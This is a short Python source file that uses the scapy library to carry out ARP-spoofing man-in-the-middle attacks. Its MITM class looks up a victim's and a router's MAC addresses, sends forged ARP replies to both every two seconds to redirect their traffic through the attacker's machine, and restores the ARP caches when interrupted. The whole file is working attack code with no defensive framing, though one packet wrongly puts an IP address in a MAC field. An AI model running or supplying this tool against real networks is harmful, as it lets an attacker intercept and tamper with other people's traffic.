import time

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp


class MITM:
    def __init__(self, victim_ip: str, router_ip: str):
        self.interface = 'wlp2s0'
        self.__victim_ip = victim_ip
        self.__victim_mac = MITM._get_mac(self.__victim_ip, self.interface)
        self.__router_ip = router_ip
        self.__router_mac = MITM._get_mac(router_ip, self.interface)

    @staticmethod
    def _get_mac(ip: str, interface: str):
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req = broadcast / ARP(pdst=ip)
        answers = srp(arp_req, timeout=5, iface=interface, verbose=False)[0]
        return answers[0][1].hwsrc

    def reassign(self):
        srp(ARP(op=2, pdst=self.__router_ip, psrc=self.__victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.__victim_mac,
                retry=7), verbose=False)
        srp(ARP(op=2, pdst=self.__victim_ip, psrc=self.__router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.__router_mac,
                retry=7), verbose=False)

    def attack(self):
        # attack itself
        srp(ARP(op=2, pdst=self.__victim_ip, psrc=self.__router_ip, hwdst=self.__victim_mac), verbose=False)
        srp(ARP(op=2, pdst=self.__router_ip, psrc=self.__victim_ip, hwdst=self.__router_ip), verbose=False)

    def launch(self):
        try:
            while True:
                self.attack()
                time.sleep(2)
        except KeyboardInterrupt:
            self.reassign()
